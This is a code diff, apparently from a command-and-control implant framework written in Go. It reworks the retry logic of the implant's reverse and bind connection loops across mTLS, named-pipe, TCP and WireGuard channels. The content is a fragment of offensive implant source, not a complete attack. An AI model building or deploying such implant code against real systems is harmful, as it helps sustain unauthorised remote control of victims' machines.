@@ -50,7 +50,7 @@ import (
 func (t *C2) startReverse() (err error) {
 
 	// {{if .Config.Debug}}
-	log.Printf("Connecting (reverse) -> %s (%s)", t.uri.Host, t.uri.Scheme)
+	log.Printf("Connecting (reverse) %s <- (%s)", t.uri.Host, t.uri.Scheme)
 	// {{end}}
 
 	for t.attempts < int(t.Profile.MaxConnectionErrors) {
@@ -110,7 +110,7 @@ func (t *C2) startReverse() (err error) {
 			// Once we will close this C2 channel, we need to perform custom
 			// cleanup here: closing the WireGuard virtual interface:
 			// Passed to the Session layer when setting up the Session.
-			t.cleanup = func() error {
+			t.Connection.Cleanup = func() error {
 				// {{if .Config.Debug}}
 				log.Printf("Closing Wireguard interface")
 				// {{end}}
@@ -161,9 +161,10 @@ func (t *C2) startReverse() (err error) {
 		time.Sleep(time.Duration(t.Profile.Interval))
 	}
 
-	// {{if .Config.Debug}}
-	log.Printf("Transport %s set up and running (%s)", t.ID, t.uri)
-	// {{end}}
+	// Only return an error if we have exhausted attempts
+	if t.attempts == int(t.Profile.MaxConnectionErrors) {
+		return ErrMaxAttempts
+	}
 
 	return
 }
@@ -177,7 +178,6 @@ func (t *C2) startBind() (err error) {
 	log.Printf("Listening (bind) on %s (%s)", t.uri.Host, t.uri.Scheme)
 	// {{end}}
 
-ConnLoop:
 	for t.attempts < int(t.Profile.MaxConnectionErrors) {
 		switch t.uri.Scheme {
 
@@ -192,7 +192,6 @@ ConnLoop:
 				t.FailedAttempt()
 				continue
 			}
-			break ConnLoop
 			// {{end}} - MTLSc2Enabled
 
 		// {{if .Config.NamePipec2Enabled}}
@@ -205,7 +204,6 @@ ConnLoop:
 				t.FailedAttempt()
 				continue
 			}
-			break ConnLoop
 			// {{end}} -NamePipec2Enabled
 
 		// {{if .Config.TCPc2Enabled}}
@@ -219,14 +217,18 @@ ConnLoop:
 				t.FailedAttempt()
 				continue
 			}
-			break ConnLoop
 			// {{end}} - TCPc2Enabled
 
 		default:
 			// {{if .Config.Debug}}
 			log.Printf("Invalid C2 address sheme: %s", t.uri.Scheme)
 			// {{end}}
-			break ConnLoop // Avoid ConnLoop not used
+			return nil
+		}
+
+		// If the connection is set (and thus not nil), break and return
+		if t.Conn != nil {
+			break
 		}
 
 		// In case of failure to initiate a session, sleep
@@ -235,9 +237,10 @@ ConnLoop:
 		time.Sleep(time.Duration(t.Profile.Interval))
 	}
 
-	// {{if .Config.Debug}}
-	log.Printf("Transport %s set up and running (%s)", t.ID, t.uri)
-	// {{end}}
+	// Only return an error if we have exhausted attempts
+	if t.attempts == int(t.Profile.MaxConnectionErrors) {
+		return ErrMaxAttempts
+	}
 
 	return
 }
